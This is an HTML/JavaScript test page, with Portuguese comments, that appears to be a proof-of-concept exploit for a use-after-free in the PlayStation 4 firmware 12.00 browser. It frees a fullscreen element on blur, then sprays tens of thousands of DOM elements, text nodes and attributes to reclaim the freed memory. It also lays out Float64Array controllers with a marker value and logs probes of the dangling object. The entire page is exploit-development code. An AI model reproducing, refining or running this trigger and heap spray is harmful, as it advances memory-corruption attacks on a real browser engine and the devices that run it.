
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Aggressive Reclaim (Robust Log)</title>
</head>

<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Aggressive Reclaim (Hybrid + Stable Log)</h2>
<button onclick="runTest()">Run Test</button>

<!-- LOG VISUAL ORIGINAL (mantido) -->
<div id="log" style="margin-top:20px;"></div>

<!-- 🔥 LOG ROBUSTO (overlay fixo) -->
<textarea id="logBox"
style="
position:fixed;
bottom:0;
left:0;
width:100%;
height:40%;
background:#000;
color:#0f0;
z-index:999999;
font-family:monospace;
"></textarea>

<script>

// ==========================
// 🔒 LOG ROBUSTO (NOVO)
// ==========================
let logBuffer = [];

function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);

    // mantém também log visual simples (não confiável, mas útil)
    try {
        document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
    } catch(e){}
}

function flushLog() {
    let box = document.getElementById("logBox");
    if (!box) return;

    box.value = logBuffer.join("\n");
}

// captura exceções (CRÍTICO em UAF)
window.onerror = function(e) {
    log("[EXCEPTION] " + e);
    flushLog();
};

// ==========================
const PATTERN = 2.121995791e-314;

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 AGGRESSIVE RECLAIM (INALTERADO)
// ==========================
function aggressiveReclaim() {
    log("[*] Aggressive reclaim iniciado");

    let bucket = [];

    // Fase 1 — churn
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // Fase 2 — Element spray
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");

        el.innerHTML = "REUSE_EL_" + i;
        el.style.position = "absolute";
        el.style.width = "100%";
        el.style.height = "100%";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // Fase 3 — TextNode spray
    for (let i = 0; i < 10000; i++) {
        let txt = document.createTextNode("TXT_" + i);
        document.body.appendChild(txt);
        bucket.push(txt);
    }

    // Fase 4 — Attribute spray
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        el.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(el);
        bucket.push(el);
    }

    // Fase 5 — churn final
    for (let i = 0; i < 5000; i++) {
        let el = document.createElement("span");
        document.body.appendChild(el);
        el.remove();
    }

    log("[*] Aggressive reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// DETECÇÃO EXPANDIDA (SEU PADRÃO)
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try {
        log("[CHECK] innerHTML = " + fsTarget.innerHTML);
    } catch(e) {
        log("[UAF] innerHTML erro: " + e);
    }

    try {
        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
    } catch(e) {}

    try {
        log("[CHECK] childNodes = " + fsTarget.childNodes.length);
    } catch(e) {}

    try {
        log("[CHECK] firstChild = " + fsTarget.firstChild);
    } catch(e) {}

    try {
        log("[CHECK] data-x = " + fsTarget.getAttribute("data-x"));
    } catch(e) {}
}

// ==========================
// TRIGGER (INALTERADO + flush)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger: remove + exitFullscreen");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
        }

    } catch(e) {
        log("[ERRO] " + e);
    }

    // 🔥 janela crítica original preservada
    setTimeout(() => aggressiveReclaim(), 0);
    setTimeout(() => aggressiveReclaim(), 50);
    setTimeout(() => aggressiveReclaim(), 100);

    // 🔬 checagem
    setTimeout(() => checkUAF(fsTarget), 300);

    // 🔥 flush ANTES do reload (CRÍTICO)
    setTimeout(() => flushLog(), 350);
    setTimeout(() => flushLog(), 600);
    setTimeout(() => flushLog(), 1000);

    // 🔁 comportamento original (INALTERADO)
    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    const logDiv = document.getElementById("log");
    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";

    logBuffer = []; // limpa buffer

    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur disparado");

        // ⚠️ timing CRÍTICO mantido
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
